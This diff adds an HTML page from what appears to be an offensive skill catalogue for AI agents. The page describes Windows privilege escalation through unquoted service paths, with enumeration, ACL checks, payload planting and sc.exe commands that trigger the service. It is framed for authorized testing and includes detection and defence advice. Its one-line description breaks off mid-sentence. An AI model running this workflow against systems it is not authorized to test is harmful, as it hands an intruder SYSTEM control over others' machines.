@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: unquoted-service-paths</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>unquoted-service-paths</h2><div class="meta"><span class="badge gray">privesc</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you have a low-privilege Windows shell on an</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="privesc-windows.html">privesc-windows</a></div><div class="deps"><span class="kind">requires:</span> <a href="privesc-windows.html">privesc-windows</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="privesc-linux.html">privesc-linux</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>PowerShell</td><td>7.4</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Windows resolves an unquoted service path with spaces by trying each prefix: <code>C:\Program Files\My App\service.exe</code> tries <code>C:\Program.exe</code>, then <code>C:\Program Files\My.exe</code>, before the real binary. A writable directory early in that chain plus a service restart equals SYSTEM. This skill covers the full check on authorized engagements: enumeration, writability testing, payload planting, and safe triggering.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Enumerate all services with their binary paths and start types.</li>
+<li>Flag paths that contain spaces and lack quotes.</li>
+<li>For each, test writability of every directory in the resolution chain.</li>
+<li>Check who can restart the service (or wait for a reboot).</li>
+<li>Plant a proof executable at the winning path with approval.</li>
+<li>Trigger the service and confirm SYSTEM execution.</li>
+<li>Remove the payload and restore the original state.</li>
+</ol>
+<h2>1. Enumeration</h2>
+<pre><code class="language-powershell"># List services with binary paths (PowerShell)
+Get-CimInstance Win32_Service | Select-Object Name, PathName, StartMode, State |
+  Where-Object { $_.PathName -notlike &#x27;&quot;*&#x27; -and $_.PathName -like &#x27;* *&#x27; }
+
+# Classic wmic equivalent on older hosts
+wmic service get name,displayname,pathname,startmode | findstr /i /v &quot;C:\Windows\\&quot;
+
+# Focus: third-party services in Program Files are the usual winners;
+# Windows built-ins are almost always quoted</code></pre>
+<p>The filter matters: quoted paths and paths without spaces cannot be abused this way. What remains is usually a short list, often one or two services.</p>
+<h2>2. Writability and restart rights</h2>
+<pre><code class="language-powershell"># Test each directory in the chain, e.g. C:\Program Files\My App\service.exe
+# Chain: C:\, C:\Program Files\, C:\Program Files\My App\
+$dirs = @(&#x27;C:\&#x27;, &#x27;C:\Program Files\&#x27;, &#x27;C:\Program Files\My App\&#x27;)
+foreach ($d in $dirs) {
+  $acl = Get-Acl $d
+  $acl.Access | Where-Object { $_.IdentityReference -like &#x27;*Users*&#x27; -and
+    $_.FileSystemRights -like &#x27;*Write*&#x27; } | Select-Object IdentityReference, FileSystemRights
+}
+
+# Can you restart the service? Check service permissions
+sc.exe qc &quot;VulnerableService&quot;
+# Look for SERVICE_START / SERVICE_STOP for your user, or check with accesschk</code></pre>
+<p>You need two things: a writable directory in the chain AND a way to (start, restart) the service. Writable without restart means waiting for a reboot; restart without writability means nothing. Confirm both before planting anything.</p>
+<h2>3. Payload and trigger</h2>
+<pre><code class="language-powershell"># Generate a proof payload on your attack box (msfvenom pattern),
+# then copy it to the winning path, e.g. C:\Program.exe
+# Proof payload: adds a user or writes a marker file as SYSTEM
+
+# Plant with approval, then trigger
+sc.exe stop &quot;VulnerableService&quot;
+sc.exe start &quot;VulnerableService&quot;
+
+# Confirm: check for the marker or the new process running as SYSTEM
+tasklist /v | findstr /i &quot;payload&quot;</code></pre>
+<p>Use a benign proof first (write <code>C:\proof.txt</code> as SYSTEM) before any payload that adds users or opens shells. The finding is proven at the marker file; escalate the payload only as the engagement needs.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The path has spaces but IS quoted. Not vulnerable; move on without</li>
+<p>testing further.</p>
+<li>The directory is writable but the service cannot be restarted by you.</li>
+<p>Note it as a reboot-dependent path, or check for other triggers (service crashes, scheduled restarts).</p>
+<li>The service runs as a service account, not SYSTEM. Still valuable:</li>
+<p>escalate to that account first, then continue privesc from there.</p>
+<li>Modern Windows quotes more paths by default. The yield is lower than</li>
+<p>it was in 2010, but third-party installers still get it wrong.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No unquoted paths: move to alwaysinstallelevated, dll-hijacking, and</li>
+<p>token-impersonation in the privesc-windows order.</p>
+<li>The payload planted but the service failed to start: check the binary</li>
+<p>name the service actually tried (ProcMon on a lab replica helps), and clean up the failed payload.</p>
+<li>Cleanup is mandatory: remove the planted executable and verify the</li>
+<p>service still starts correctly afterward.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see this as a new executable appearing in Program Files, a service starting an unexpected binary, and SYSTEM processes with odd parents. Sysmon and EDR catch the process-creation anomaly; FIM catches the new file. Defenses are quoting all service paths (installer hygiene), locking down Program Files ACLs, monitoring service binary changes, and alerting on services spawning unusual children.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1574.009 (Hijack Execution Flow: Path Interception by</li>
+<p>Unquoted Path).</p>
+<li>CWE-428 (Unquoted Search Path or Element).</li>
+<li>Microsoft guidance on secure service installation.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
